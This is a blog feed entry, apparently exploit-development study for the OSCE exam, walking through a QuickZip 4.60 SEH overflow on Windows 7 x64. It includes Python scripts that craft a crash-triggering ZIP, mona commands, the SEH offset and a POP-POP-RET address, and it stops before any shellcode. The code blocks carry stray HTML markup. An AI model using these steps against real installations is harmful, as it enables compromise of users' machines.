<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Egghunter | Knapsy's brain dump]]></title>
  <link href="http://blog.knapsy.com/blog/categories/egghunter/atom.xml" rel="self"/>
  <link href="http://blog.knapsy.com/"/>
  <updated>2018-08-05T19:22:49+10:00</updated>
  <id>http://blog.knapsy.com/</id>
  <author>
    <name><![CDATA[Knapsy]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[QuickZip 4.60 - Win7 X64 SEH Overflow (Egghunter) With Custom Encoder]]></title>
    <link href="http://blog.knapsy.com/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/"/>
    <updated>2017-05-01T21:31:30+10:00</updated>
    <id>http://blog.knapsy.com/blog/2017/05/01/quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder</id>
    <content type="html"><![CDATA[<p>As a part of my preparations for the <a href="https://www.offensive-security.com/information-security-certifications/osce-offensive-security-certified-expert/">OSCE</a> exam, I have been trying to find some interesting exploits and PoC code to practice my skills on and learn something new in the exploit development department.</p>

<p>After some digging, I stumbled across a <a href="https://www.exploit-db.com/exploits/11656/">QuickZip v4.60 Buffer Overflow exploit</a>, which is very well documented by <a href="https://twitter.com/corelanc0d3r">corelanc0d3r</a> in a thorough blog post <a href="https://www.corelan.be/index.php/2010/03/27/quickzip-stack-bof-0day-a-box-of-chocolates/">here</a>.</p>

<p>Since the exploit itself is from 2010, it was designed to work on 32-bit Windows XP only. I decided to try and see if I can recreate it on a 64-bit Windows 7 and damn, was that a (fun) challenge!</p>

<!--more-->


<h2>PoC</h2>

<p>To get started, I grabbed the <a href="https://www.exploit-db.com/exploits/11656/">QuickZip v4.60 Windows XP exploit from exploit-db</a> and cut it down to create a simple PoC triggering a crash.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">max_size</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>The above code creates a ZIP of a single file named 4064 A&rsquo;s followed by a &ldquo;.txt&rdquo; extension. <code>Header_1</code>, <code>header_2</code> and <code>header_3</code> are the headers required by the ZIP file structure. I won&rsquo;t go into the details of it, but you can read more about it on <a href="https://en.wikipedia.org/wiki/Zip_(file_format">here</a>.</p>

<p>If you open the created ZIP file in QuickZip and try to extract its contents (or just double-click on the filename), the QuickZip will crash.</p>

<h2>Understanding the crash</h2>

<p>Ok, let&rsquo;s run the PoC and see what actually happens.</p>

<p>Create the ZIP file using Python script above, open it up with QuickZip, start <code>ImmunityDebugger</code>, attach to the QuickZip process and, in QuickZip, double click on the filename to trigger the crash. <strong>Note:</strong> we will be repeating this process over, and over, and over again, so get used to it!</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash.png" alt="image" /></a></p>

<p>Awesome, we triggered a crash as expected. Also, we got an exception - see the bottom of the screen <em>&ldquo;Access violation when writing to [00190000]&rdquo;</em>. What this means is that we were trying to write to an invalid memory address and we triggered an exception.</p>

<p>Let&rsquo;s investigate the SEH chain.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash_SEH_chain.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/1.First_crash_SEH_chain.png" alt="image" /></a></p>

<p>Great, it appears that we&rsquo;re able to control nSEH pointer! Looks very promising. Let&rsquo;s try to figure out the offsets.</p>

<h2>Offsets</h2>

<p>As always, I&rsquo;m going to be using <code>mona</code> (<a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a>) to help us out with a lot of tasks here.</p>

<p>First, let&rsquo;s generate a pattern of <strong>4064</strong> unique characters and put it in the payload of our PoC exploit:
<code>
!mona pc 4064
</code></p>

<p>Let&rsquo;s trigger the crash again and see what happens.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/2.Second%20crash.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/2.Second%20crash.png" alt="image" /></a></p>

<p>Hmm, the crash looks a bit different. The problem here is that <code>LEAVE</code> instruction tries to jump back to <code>0EEDFADE</code> address from the stack, which is an invalid memory address for this program.</p>

<p>Also, it doesn&rsquo;t appear that we&rsquo;re controlling the SEH anymore.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/3.second%20crash%20-%20wrong%20SEH.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/3.second%20crash%20-%20wrong%20SEH.png" alt="image" /></a></p>

<p>However, notice that we&rsquo;re actually in a kernel module (see the name of the Immunity window - <em>&ldquo;CPU - main thread, module KERNELBA&rdquo;</em>). Pass the execution back to the program with <code>SHIFT + F9</code> and see if we trigger another exception, but in the QuickZip module.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/4.proper%20crash.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/4.proper%20crash.png" alt="image" /></a></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/5.proper%20SEH.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/5.proper%20SEH.png" alt="image" /></a></p>

<p>Awesome, looks like we&rsquo;re back in business!</p>

<p>Use the following command to let mona calculate all of the offsets:
<code>
!mona findmsp
</code></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/6.mona%20findmsp.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/6.mona%20findmsp.png" alt="image" /></a></p>

<p>At this stage, the most interesting offset for us is <code>nSEH field: offset 292</code>.</p>

<p>Let&rsquo;s update the PoC with offsets information and try to trigger the crash again.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_1</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_2</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x14</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xB7</span>\<span class="n">xAC</span>\<span class="n">xCE</span>\<span class="n">x34</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xe4</span>\<span class="n">x0f</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x24</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">header_3</span> <span class="o">=</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x4B</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x12</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x02</span>\<span class="n">x10</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Building</span> <span class="n">PoC</span><span class="o">..&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">max_size</span> <span class="o">=</span> <span class="mi">4064</span>
</span><span class='line'><span class="n">nseh_offset</span> <span class="o">=</span> <span class="mi">292</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">nseh_offset</span>     <span class="c"># padding for nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">BBBB</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>               <span class="c"># nSEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">CCCC</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>               <span class="c"># SEH</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="p">(</span><span class="n">max_size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>   <span class="c"># padding for the rest of payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">.</span><span class="n">txt</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Length</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">exploit</span> <span class="o">=</span> <span class="n">header_1</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_2</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">header_3</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">mefile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">cst</span><span class="o">.</span><span class="n">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">w</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exploit</span><span class="p">);</span>
</span><span class='line'><span class="n">mefile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="o">+</span><span class="p">]</span> <span class="n">Exploit</span> <span class="n">complete</span><span class="err">!</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/7.SEH%20properly%20overwritten.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/7.SEH%20properly%20overwritten.png" alt="image" /></a></p>

<p>Great, we have control of the SEH! Let&rsquo;s pass exception to the program (<code>SHIFT + F9</code>) and investigate further what happens.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/8.SEH%20pop-pop-ret%20STACK%20view.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/8.SEH%20pop-pop-ret%20STACK%20view.png" alt="image" /></a></p>

<p>Of course another exception triggered, since <code>43434343</code> is an invalid memory address for this program, but let&rsquo;s see what happens on the stack - typically for SEH overflows, we&rsquo;ll need invoke a set of <em>POP-POP-RET</em> instructions to return to our buffer.</p>

<p>It&rsquo;ll be easy to find such instructions with <code>mona</code>, but first, we have to know what characters are we actually allowed to use. And that&rsquo;s where the problems start&hellip;</p>

<h2>Badchars</h2>

<p>Well, in summary, it&rsquo;s most of them. Why? Because our overflow is on the filename parameter and filenames are quite restricted - generally ASCII printable characters only.</p>

<p>Since it would take way too long to actually manually go through it with mona and try to find all bad chars, I just assumed that I can only use pretty much entire ASCII table (characters up to 0x7F) except <code>0x00</code>, <code>0x0a</code> and <code>0x0d</code> (<code>NULL</code> byte, new line and carriage-return respectively).</p>

<p>This assumption may make it more difficult than it really is (since I may be avoiding characters that are actually OK to use) or may cause me even more problems later if some of the characters from my assumed range are, in fact, incorrect.</p>

<p>I don&rsquo;t really like making assumptions like this, but for the sake of this exercise, let&rsquo;s make an exception.</p>

<p>I will just need to remember to be careful and if something doesn&rsquo;t work, to double check bad chars once again. A bit risky, but well, bring it on!</p>

<h2>POP-POP-RET</h2>

<p>Let&rsquo;s find an exploit-friendly address of a <em>POP-POP-RET</em> instructions with mona:
<code>
!mona seh
</code></p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/9.pop-pop-ret-mona.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/9.pop-pop-ret-mona.png" alt="image" /></a></p>

<p>A lot of results are found (7909!), but the highlighted result looks promising - consists of all aphanumerical characters and is located in the <code>QuickZip.exe</code> binary itself, hopefully making it more cross-platform friendly as we don&rsquo;t need to rely on specific operating system DLLs.</p>

<p>The only problem here is the <code>0x00</code> byte, however, because of the address space of the program, every address starts with <code>0x00</code>&hellip; let&rsquo;s try and see if it&rsquo;ll actually break our exploit.</p>

<p>Update the PoC exploit replacing <code>CCCC</code> currently representing SEH with <code>\x33\x28\x42\x00</code>, trigger the crash once again and investigate SEH chain.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/10.SEH%20chain%20with%20pop-pop-ret.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/10.SEH%20chain%20with%20pop-pop-ret.png" alt="image" /></a></p>

<p>Great, looks like our address wasn&rsquo;t scrambled and looks like we expected it to look. Set the breakpoint at it (<code>F2</code>) and press <code>SHIFT + F9</code> to pass the control to the program.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/11.pop-pop-ret%20instructions.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/11.pop-pop-ret%20instructions.png" alt="image" /></a></p>

<p>As you can see, we&rsquo;re redirected to <em>POP-POP-RET</em> instructions, let&rsquo;s step through them with <code>F8</code> and stop after <code>RETN 4</code> instruction.</p>

<p><a href="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png"><img src="/images/posts/2017-05-01-quickzip-4-dot-60-win7-x64-seh-overflow-egghunter-with-custom-encoder/12.after%20pop%20pop%20ret.png" alt="image" /></a></p>

<p>Awesome, we have landed back in our payload&hellip; but there&rsquo;s a problem. Because of the <code>NULL</code> byte, everything after SEH chain got cut off, not leaving us much space to do anything at all.</p>

<h2>Where did the shellcode go?!</h2>

<p>OK, let&rsquo;s analyse the situation and see where are we at.</p>

